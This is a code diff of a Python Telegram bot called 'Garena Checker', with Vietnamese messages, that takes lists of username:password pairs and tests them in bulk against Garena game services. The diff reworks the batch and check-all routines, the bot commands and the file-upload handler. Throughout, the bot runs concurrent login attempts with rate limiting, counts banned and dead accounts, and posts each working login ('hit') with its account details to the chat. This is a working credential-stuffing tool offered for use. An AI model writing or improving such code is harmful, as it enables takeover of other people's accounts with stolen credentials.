-        is_banned = result.get("_is_banned", False)
-        all_results.append({
-            "user": user,
-            "pwd": pwd,
-            "status": result_type,
-            "data": result,
-            "banned": is_banned
-        })
-        with stats_lock:
-            stats["checked"] += 1
-            if is_banned or result_type == "banned":
-                stats["banned"] += 1
-                return
-            if result_type == "hit":
-                stats["hits"] += 1
-                hit_details.append({"user": user, "pwd": pwd, "service": service, "time": datetime.now().isoformat()})
-                try:
-                    hit_msg = format_full_info_compact(user, pwd, service, result)
-                    safe_send_message(chat_id, hit_msg)
-                except:
-                    pass
-            elif result_type == "dead":
-                stats["dead"] += 1
-            else:
-                stats["errors"] += 1
-
-    for batch in batches:
+    
+    safe_send_message(chat_id, f"📊 Check {total} accounts...")
+    
+    batches = [accounts[i:i+CHECKMULTI_BATCH_SIZE] for i in range(0, total, CHECKMULTI_BATCH_SIZE)]
+    
+    for batch_num, batch in enumerate(batches, 1):
         if stop_event.is_set():
             break
-        batch_num += 1
-        if last_batch_msg:
-            safe_delete_message(chat_id, last_batch_msg.message_id)
-            last_batch_msg = None
-        last_batch_msg = safe_send_message(chat_id, f"📦 BATCH {batch_num}/{total_batches} - {len(batch)} acc...", auto_delete=True, delete_after=5)
+        
+        def process(user, pwd):
+            if stop_event.is_set():
+                return
+            rate_limit(CHECKMULTI_DELAY)
+            result = check_account_api(user, pwd, service, use_delay=False)
+            with stats_lock:
+                stats["checked"] += 1
+                if result.get("result") == "banned":
+                    stats["banned"] += 1
+                elif result.get("result") == "hit":
+                    stats["hits"] += 1
+                    hit_details.append({"user": user, "pwd": pwd, "service": service, "time": datetime.now().isoformat()})
+                    safe_send_message(chat_id, format_hit_info(user, pwd, service, result))
+                elif result.get("result") == "dead":
+                    stats["dead"] += 1
+                else:
+                    stats["errors"] += 1
+        
         with ThreadPoolExecutor(max_workers=CHECKMULTI_THREADS) as executor:
-            futures = {executor.submit(process_single, user, pwd): (user, pwd) for user, pwd in batch}
+            futures = {executor.submit(process, u, p): (u, p) for u, p in batch}
             for future in as_completed(futures):
                 if stop_event.is_set():
                     executor.shutdown(wait=False)
                     break
-        elapsed = time.time() - stats["start_time"]
-        speed = stats["checked"] / elapsed if elapsed > 0 else 0
-        percent = (stats["checked"] / total) * 100
-        if last_progress_msg:
-            safe_delete_message(chat_id, last_progress_msg.message_id)
-            last_progress_msg = None
-        last_progress_msg = safe_send_message(chat_id, f"📊 {stats['checked']}/{total} ({percent:.1f}%) | ✅{stats['hits']} ❌{stats['dead']} 🚫{stats['banned']}", auto_delete=True, delete_after=5)
-        if batch_num < total_batches:
+        
+        if batch_num < len(batches):
             time.sleep(CHECKMULTI_BATCH_DELAY)
+    
     checking = False
     elapsed = time.time() - stats["start_time"]
-    if last_progress_msg:
-        safe_delete_message(chat_id, last_progress_msg.message_id)
-        last_progress_msg = None
-    if last_batch_msg:
-        safe_delete_message(chat_id, last_batch_msg.message_id)
-        last_batch_msg = None
-    update_stats(hit_count=stats["hits"], dead_count=stats["dead"], error_count=stats["errors"], banned_count=stats["banned"], accounts=accounts, hit_details=hit_details, service=service)
-    summary = f"✅ CHECK HOAN TAT!\n━━━━━━━━━━━━━━━━\n📊 Tong: {stats['total']}\n🎯 HIT: {stats['hits']}\n❌ DEAD: {stats['dead']}\n🚫 BANNED: {stats['banned']}\n⚠️ ERROR: {stats['errors']}\n⏱ {elapsed:.1f}s"
-    hits_list = [r for r in all_results if r["status"] == "hit" and not r["banned"]]
-    if hits_list:
-        summary += f"\n📌 HIT LIST ({len(hits_list)}):\n"
-        for r in hits_list[:30]:
-            summary += f"✅ <code>{r['user']}:{r['pwd']}</code>\n"
-        if len(hits_list) > 30:
-            summary += f"... va {len(hits_list) - 30} hits khac"
-    safe_send_message(chat_id, summary)
+    update_stats(hit_count=stats["hits"], dead_count=stats["dead"], error_count=stats["errors"], 
+                 banned_count=stats["banned"], accounts=accounts, hit_details=hit_details, service=service)
+    
+    safe_send_message(chat_id, f"✅ CHECK HOAN TAT!\n━━━━━━━━━━━━━━━━\n📊 Tong: {stats['total']}\n🎯 HIT: {stats['hits']}\n❌ DEAD: {stats['dead']}\n🚫 BANNED: {stats['banned']}\n⚠️ ERROR: {stats['errors']}\n⏱ {elapsed:.1f}s")
 
-def check_all_services(chat_id, accounts, cmd_msg=None):
-    global checking, last_progress_msg, last_batch_msg
-    
-    if cmd_msg:
-        threading.Thread(target=delete_later, args=(chat_id, cmd_msg.message_id, 2), daemon=True).start()
-    
+def check_all_services(chat_id, accounts):
+    global checking
     if checking:
-        safe_send_message(chat_id, "⚠️ Dang check roi!", auto_delete=True, delete_after=5)
+        safe_send_message(chat_id, "⚠️ Dang check roi!")
         return
     if not accounts:
         safe_send_message(chat_id, "❌ Khong co accounts!")
         return
+    
     checking = True
     stop_event.clear()
-    total_accounts = len(accounts)
-    total_services = len(SERVICE_ROUTES)
-    stats_all = {
-        "total": total_accounts * total_services,
-        "checked": 0,
-        "hits": 0,
-        "dead": 0,
-        "errors": 0,
-        "banned": 0,
-        "start_time": time.time()
-    }
-    all_results = []
+    stats_all = {"total": len(accounts) * len(SERVICE_ROUTES), "checked": 0, "hits": 0, "dead": 0, "errors": 0, "banned": 0, "start_time": time.time()}
     hit_details = []
-    last_progress_msg = None
-    last_batch_msg = None
-
-    def process_all(user, pwd, service):
-        if stop_event.is_set():
-            return
-        rate_limit(DEFAULT_DELAY)
-        result = check_account_api(user, pwd, service, use_delay=False)
-        result_type = result.get("result", "unknown")
-        is_banned = result.get("_is_banned", False)
-        all_results.append({
-            "user": user,
-            "pwd": pwd,
-            "service": service,
-            "status": result_type,
-            "banned": is_banned
-        })
-        with stats_lock:
-            stats_all["checked"] += 1
-            if is_banned or result_type == "banned":
-                stats_all["banned"] += 1
-                return
-            if result_type == "hit":
-                stats_all["hits"] += 1
-                hit_details.append({"user": user, "pwd": pwd, "service": service, "time": datetime.now().isoformat()})
-                try:
-                    hit_msg = format_full_info_compact(user, pwd, service, result)
-                    safe_send_message(chat_id, hit_msg)
-                except:
-                    pass
-            elif result_type == "dead":
-                stats_all["dead"] += 1
-            else:
-                stats_all["errors"] += 1
-
-    batches = []
-    for i in range(0, len(accounts), CHECKMULTI_BATCH_SIZE):
-        batch_accounts = accounts[i:i + CHECKMULTI_BATCH_SIZE]
-        batches.append(batch_accounts)
-    batch_num = 0
-    total_batches = len(batches)
-    for batch_accounts in batches:
+    
+    safe_send_message(chat_id, f"📊 Check all {len(accounts)} accounts...")
+    
+    batches = [accounts[i:i+CHECKMULTI_BATCH_SIZE] for i in range(0, len(accounts), CHECKMULTI_BATCH_SIZE)]
+    
+    for batch_num, batch_accounts in enumerate(batches, 1):
         if stop_event.is_set():
             break
-        batch_num += 1
-        if last_batch_msg:
-            safe_delete_message(chat_id, last_batch_msg.message_id)
-            last_batch_msg = None
-        last_batch_msg = safe_send_message(chat_id, f"📦 BATCH {batch_num}/{total_batches} - {len(batch_accounts)} acc x {total_services} services...", auto_delete=True, delete_after=5)
-        all_tasks = [(user, pwd, service) for user, pwd in batch_accounts for service in SERVICE_ROUTES.keys()]
+        
+        tasks = [(u, p, s) for u, p in batch_accounts for s in SERVICE_ROUTES.keys()]
+        
+        def process(user, pwd, service):
+            if stop_event.is_set():
+                return
+            rate_limit(DEFAULT_DELAY)
+            result = check_account_api(user, pwd, service, use_delay=False)
+            with stats_lock:
+                stats_all["checked"] += 1
+                if result.get("result") == "banned":
+                    stats_all["banned"] += 1
+                elif result.get("result") == "hit":
+                    stats_all["hits"] += 1
+                    hit_details.append({"user": user, "pwd": pwd, "service": service, "time": datetime.now().isoformat()})
+                    safe_send_message(chat_id, format_hit_info(user, pwd, service, result))
+                elif result.get("result") == "dead":
+                    stats_all["dead"] += 1
+                else:
+                    stats_all["errors"] += 1
+        
         with ThreadPoolExecutor(max_workers=DEFAULT_THREADS) as executor:
-            futures = {executor.submit(process_all, user, pwd, service): (user, pwd, service) for user, pwd, service in all_tasks}
+            futures = {executor.submit(process, u, p, s): (u, p, s) for u, p, s in tasks}
             for future in as_completed(futures):
                 if stop_event.is_set():
                     executor.shutdown(wait=False)
                     break
-        elapsed = time.time() - stats_all["start_time"]
-        speed = stats_all["checked"] / elapsed if elapsed > 0 else 0
-        percent = (stats_all["checked"] / stats_all["total"]) * 100
-        if last_progress_msg:
-            safe_delete_message(chat_id, last_progress_msg.message_id)
-            last_progress_msg = None
-        last_progress_msg = safe_send_message(chat_id, f"📊 {stats_all['checked']}/{stats_all['total']} ({percent:.1f}%) | ✅{stats_all['hits']} ❌{stats_all['dead']} 🚫{stats_all['banned']}", auto_delete=True, delete_after=5)
-        if batch_num < total_batches:
+        
+        if batch_num < len(batches):
             time.sleep(CHECKMULTI_BATCH_DELAY)
+    
     checking = False
     elapsed = time.time() - stats_all["start_time"]
-    if last_progress_msg:
-        safe_delete_message(chat_id, last_progress_msg.message_id)
-        last_progress_msg = None
-    if last_batch_msg:
-        safe_delete_message(chat_id, last_batch_msg.message_id)
-        last_batch_msg = None
-    update_stats(hit_count=stats_all["hits"], dead_count=stats_all["dead"], error_count=stats_all["errors"], banned_count=stats_all["banned"], accounts=accounts, hit_details=hit_details, service="fullpack")
-    summary = f"✅ CHECK ALL HOAN TAT!\n━━━━━━━━━━━━━━━━\n🎯 HIT: {stats_all['hits']}\n❌ DEAD: {stats_all['dead']}\n🚫 BANNED: {stats_all['banned']}\n⚠️ ERRORS: {stats_all['errors']}\n⏱ {elapsed:.1f}s"
-    hits_list = [r for r in all_results if r["status"] == "hit" and not r["banned"]]
-    if hits_list:
-        summary += f"\n📌 HIT LIST ({len(hits_list)}):\n"
-        for r in hits_list[:30]:
-            summary += f"✅ {r['user']}:{r['pwd']} ({r['service']})\n"
-        if len(hits_list) > 30:
-            summary += f"... va {len(hits_list) - 30} hits khac"
-    safe_send_message(chat_id, summary)
+    update_stats(hit_count=stats_all["hits"], dead_count=stats_all["dead"], error_count=stats_all["errors"],
+                 banned_count=stats_all["banned"], accounts=accounts, hit_details=hit_details, service="fullpack")
+    
+    safe_send_message(chat_id, f"✅ CHECK ALL HOAN TAT!\n━━━━━━━━━━━━━━━━\n🎯 HIT: {stats_all['hits']}\n❌ DEAD: {stats_all['dead']}\n🚫 BANNED: {stats_all['banned']}\n⚠️ ERRORS: {stats_all['errors']}\n⏱ {elapsed:.1f}s")
 
-# ========== LENH ==========
+# ========== BOT COMMANDS ==========
 @bot.message_handler(commands=['start'])
 def cmd_start(message):
     if not check_membership(message):
         return
-    msg = bot.send_message(message.chat.id, f"""🤖 GARENA CHECKER BOT V7.0 - NÂNG CẤP TOÀN DIỆN
+    safe_send_message(message.chat.id, f"""
+🤖 <b>GARENA CHECKER V8.5 - PROFESSIONAL</b>
 👤 Admin: @baohuyno1
 
-📌 LENH:
+📌 <b>LENH:</b>
 /check user:pass - Check 1 acc
 /checkmulti user1:pass1,user2:pass2 - Check nhieu
 /checkall - Check tat ca service
 /services - Danh sach service
-/stats - Xem thong ke
 /stop - Dung check
-/webstats - Xem link web thong ke
 
-⚡ TINH NANG:
-✅ Loc acc BAN - Khong hien thi
-✅ Tu dong xoa tin nhan lenh + tien do
-✅ HIT compact - an truong rong/NO/0
-✅ Khong dong khung
-✅ FULL INFO cho HIT
-✅ Web thong ke chuyen nghiep voi Chart.js
-✅ Thong ke theo service, user, ngay
-✅ Top services, top users
-✅ Tu dong refresh web""")
-    threading.Thread(target=delete_later, args=(message.chat.id, message.message_id, 5), daemon=True).start()
+⚡ <b>TINH NANG:</b>
+✅ Hien thi HIT chuyen nghiep
+✅ Format dep, day du thong tin
+✅ Web dashboard voi Chart.js
+✅ Thong ke service, user, ngay
+✅ Tu dong an truong rong
+""")
 
 @bot.message_handler(commands=['check'])
 def cmd_check(message):
@@ -1341,22 +1186,17 @@ def cmd_check(message):
         return
     parts = message.text.split()
     if len(parts) < 2:
-        msg = safe_send_message(message.chat.id, "❌ /check user:pass", auto_delete=True, delete_after=5)
-        threading.Thread(target=delete_later, args=(message.chat.id, message.message_id, 5), daemon=True).start()
+        safe_send_message(message.chat.id, "❌ /check user:pass")
         return
-    account_str = parts[1]
     service = parts[2] if len(parts) > 2 else "lienquan"
     if service not in SERVICE_ROUTES:
-        msg = safe_send_message(message.chat.id, f"❌ Service: {', '.join(SERVICE_ROUTES.keys())}", auto_delete=True, delete_after=5)
-        threading.Thread(target=delete_later, args=(message.chat.id, message.message_id, 5), daemon=True).start()
+        safe_send_message(message.chat.id, f"❌ Service: {', '.join(SERVICE_ROUTES.keys())}")
         return
-    accounts, _ = loc_tk_mk_only(account_str.replace('|', ':'))
+    accounts, _ = loc_tk_mk_only(parts[1].replace('|', ':'))
     if not accounts:
-        msg = safe_send_message(message.chat.id, "❌ Format sai! Dung: user:pass", auto_delete=True, delete_after=5)
-        threading.Thread(target=delete_later, args=(message.chat.id, message.message_id, 5), daemon=True).start()
+        safe_send_message(message.chat.id, "❌ Format sai! Dung: user:pass")
         return
-    user, pwd = accounts[0]
-    threading.Thread(target=check_single, args=(message.chat.id, user, pwd, service, message), daemon=True).start()
+    threading.Thread(target=check_single, args=(message.chat.id, accounts[0][0], accounts[0][1], service)).start()
 
 @bot.message_handler(commands=['checkmulti'])
 def cmd_checkmulti(message):
@@ -1366,71 +1206,45 @@ def cmd_checkmulti(message):
     if text.startswith('/checkmulti'):
         text = text[len('/checkmulti'):].strip()
     if not text:
-        msg = safe_send_message(message.chat.id, "❌ /checkmulti user1:pass1\\nuser2:pass2", auto_delete=True, delete_after=5)
-        threading.Thread(target=delete_later, args=(message.chat.id, message.message_id, 5), daemon=True).start()
+        safe_send_message(message.chat.id, "❌ /checkmulti user1:pass1\\nuser2:pass2")
         return
+    
     lines = text.split('\n')
     service = "lienquan"
     if lines:
-        last_line = lines[-1].strip()
-        last_word = last_line.split()[-1] if last_line.split() else ""
-        if last_word in SERVICE_ROUTES and len(last_line.split()) == 1:
+        last = lines[-1].strip()
+        last_word = last.split()[-1] if last.split() else ""
+        if last_word in SERVICE_ROUTES:
             service = last_word
-            lines = lines[:-1]
-        elif last_word in SERVICE_ROUTES and len(last_line.split()) > 1:
-            service = last_word
-            lines[-1] = last_line.rsplit(last_word, 1)[0].strip()
-    accounts_input = '\n'.join(lines).replace(',', '\n').replace('|', ':')
-    accounts, _ = loc_tk_mk_only(accounts_input)
+            lines = lines[:-1] if len(last.split()) == 1 else [last.rsplit(last_word, 1)[0].strip()] + lines[:-1]
+    
+    accounts, _ = loc_tk_mk_only('\n'.join(lines).replace(',', '\n').replace('|', ':'))
     if not accounts:
-        msg = safe_send_message(message.chat.id, "❌ Khong tim thay acc!", auto_delete=True, delete_after=5)
-        threading.Thread(target=delete_later, args=(message.chat.id, message.message_id, 5), daemon=True).start()
+        safe_send_message(message.chat.id, "❌ Khong tim thay acc!")
         return
-    msg = safe_send_message(message.chat.id, f"📊 Check {len(accounts)} accounts...", auto_delete=True, delete_after=5)
-    threading.Thread(target=delete_later, args=(message.chat.id, message.message_id, 5), daemon=True).start()
-    threading.Thread(target=check_batch, args=(message.chat.id, accounts, service, message), daemon=True).start()
+    safe_send_message(message.chat.id, f"📊 Check {len(accounts)} accounts...")
+    threading.Thread(target=check_batch, args=(message.chat.id, accounts, service)).start()
 
 @bot.message_handler(commands=['checkall'])
 def cmd_checkall(message):
     if not check_membership(message):
         return
-    global pending_accounts
     chat_id = message.chat.id
-    threading.Thread(target=delete_later, args=(chat_id, message.message_id, 5), daemon=True).start()
     if chat_id in pending_accounts and pending_accounts[chat_id]:
         accounts = pending_accounts[chat_id]
         pending_accounts[chat_id] = []
-        msg = safe_send_message(chat_id, f"📊 Check all {len(accounts)} accounts...", auto_delete=True, delete_after=5)
-        threading.Thread(target=check_all_services, args=(chat_id, accounts, message), daemon=True).start()
+        threading.Thread(target=check_all_services, args=(chat_id, accounts)).start()
     else:
-        safe_send_message(chat_id, "❌ Khong co acc nao dang cho!", auto_delete=True, delete_after=5)
+        safe_send_message(chat_id, "❌ Khong co acc nao dang cho!")
 
 @bot.message_handler(commands=['services'])
 def cmd_services(message):
     if not check_membership(message):
         return
-    msg = "📋 SERVICE:\n\n"
+    msg = "📋 <b>SERVICE:</b>\n\n"
     for key, value in SERVICE_ROUTES.items():
         msg += f"{value['icon']} <b>{key}</b>: {value['desc']}\n"
     safe_send_message(message.chat.id, msg)
-    threading.Thread(target=delete_later, args=(message.chat.id, message.message_id, 5), daemon=True).start()
-
-@bot.message_handler(commands=['stats'])
-def cmd_stats(message):
-    if not check_membership(message):
-        return
-    stats_data = load_stats()
-    msg = f"""📊 THONG KE TONG
-━━━━━━━━━━━━━━━━━━━━━━
-📦 Tong acc da check: {stats_data.get('total_checked', 0):,}
-✅ Tong hits: {stats_data.get('total_hits', 0):,}
-❌ Tong dead: {stats_data.get('total_dead', 0):,}
-🚫 Tong banned: {stats_data.get('total_banned', 0):,}
-⚠️ Tong errors: {stats_data.get('total_errors', 0):,}
-📈 Ty le HIT: {round((stats_data.get('total_hits', 0) / max(stats_data.get('total_checked', 1), 1)) * 100, 2)}%
-⏰ Lan check cuoi: {stats_data.get('last_check', 'Chua co')[:19]}"""
-    safe_send_message(message.chat.id, msg)
-    threading.Thread(target=delete_later, args=(message.chat.id, message.message_id, 5), daemon=True).start()
 
 @bot.message_handler(commands=['stop'])
 def cmd_stop(message):
@@ -1439,91 +1253,58 @@ def cmd_stop(message):
     stop_event.set()
     global checking
     checking = False
-    safe_send_message(message.chat.id, "🛑 Da dung check!", auto_delete=True, delete_after=5)
-    threading.Thread(target=delete_later, args=(message.chat.id, message.message_id, 5), daemon=True).start()
-
-@bot.message_handler(commands=['webstats'])
-def cmd_webstats(message):
-    if not check_membership(message):
-        return
-    import socket
-    try:
-        hostname = socket.gethostname()
-        local_ip = socket.gethostbyname(hostname)
-        msg = f"""🌐 WEB THONG KE NANG CAP:
-━━━━━━━━━━━━━━━━━━━━━━
-📊 http://{local_ip}:{WEB_PORT}
-📊 http://localhost:{WEB_PORT}
-
-💡 Tinh nang web:
-• Bieu do HIT/DEAD 7 ngay
-• Top services HIT
-• Top users HIT
-• Lich su chi tiet
-• HIT gan day
-• Tu dong refresh 15s
-• Responsive mobile"""
-    except:
-        msg = f"🌐 WEB THONG KE:\nhttp://localhost:{WEB_PORT}"
-    safe_send_message(message.chat.id, msg)
-    threading.Thread(target=delete_later, args=(message.chat.id, message.message_id, 5), daemon=True).start()
+    safe_send_message(message.chat.id, "🛑 Da dung check!")
 
 @bot.message_handler(content_types=['text'])
 def handle_text(message):
     if not check_membership(message):
         return
-    global pending_accounts
     text = message.text.strip()
-    chat_id = message.chat.id
     if text.startswith('/'):
         return
     accounts, _ = loc_tk_mk_only(text.replace('|', ':'))
     if not accounts:
         return
+    chat_id = message.chat.id
     if chat_id not in pending_accounts:
         pending_accounts[chat_id] = []
     pending_accounts[chat_id] = accounts
     save_loc_file(accounts)
     preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:10]])
-    total = len(accounts)
-    safe_send_message(chat_id, f"📊 LOC {total} ACCOUNTS\nPreview:\n{preview}\n👇 /checkall - Check tat ca")
+    safe_send_message(chat_id, f"📊 LOC {len(accounts)} ACCOUNTS\nPreview:\n{preview}\n👇 /checkall - Check tat ca")
 
 @bot.message_handler(content_types=['document'])
 def handle_document(message):
     if not check_membership(message):
         return
-    global pending_accounts
     chat_id = message.chat.id
     try:
-        file_name = message.document.file_name or ""
-        if not file_name.endswith('.txt'):
-            safe_send_message(chat_id, "❌ Chi ho tro file .txt!", auto_delete=True, delete_after=5)
+        if not message.document.file_name.endswith('.txt'):
+            safe_send_message(chat_id, "❌ Chi ho tro file .txt!")
             return
-        file_info = bot.get_file(message.document.file_id)
-        content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
+        content = bot.download_file(bot.get_file(message.document.file_id).file_path).decode('utf-8', errors='ignore')
         accounts, _ = loc_tk_mk_only(content.replace('|', ':'))
         if not accounts:
-            safe_send_message(chat_id, "❌ Khong tim thay user:pass!", auto_delete=True, delete_after=5)
+            safe_send_message(chat_id, "❌ Khong tim thay user:pass!")
             return
         if chat_id not in pending_accounts:
             pending_accounts[chat_id] = []
         pending_accounts[chat_id] = accounts
         save_loc_file(accounts)
         preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:20]])
-        total = len(accounts)
-        safe_send_message(chat_id, f"✅ LOC {total} ACCOUNTS\nPreview:\n{preview}\n👇 /checkall - Check tat ca")
+        safe_send_message(chat_id, f"✅ LOC {len(accounts)} ACCOUNTS\nPreview:\n{preview}\n👇 /checkall - Check tat ca")
     except Exception as e:
-        safe_send_message(chat_id, f"❌ Loi: {e}", auto_delete=True, delete_after=5)
+        safe_send_message(chat_id, f"❌ Loi: {e}")
 
 def main():
     print("=" * 60)
-    print("    GARENA CHECKER BOT V7.0 - NANG CAP TOAN DIEN")
+    print("    GARENA CHECKER V8.5 - PROFESSIONAL SYSTEM")
     print("    ADMIN: @baohuyno1")
-    print("    ===== LOC ACC BAN - KHONG HIEN THI ===== ")
-    print("    ===== AN TRUONG RONG/NO/0 ===== ")
-    print("    ===== KHONG DONG KHUNG ===== ")
-    print("    ===== WEB THONG KE CHUYEN NGHIEP ===== ")
+    print("    ===== WEB DASHBOARD + CHART.JS ===== ")
+    print("    ===== HIT FORMAT CHUYEN NGHIEP ===== ")
+    print("    ===== THONG KE SERVICE + USER ===== ")
     print("=" * 60)
+    
     while True:
         try:
             bot.polling(none_stop=True, interval=1, timeout=30)
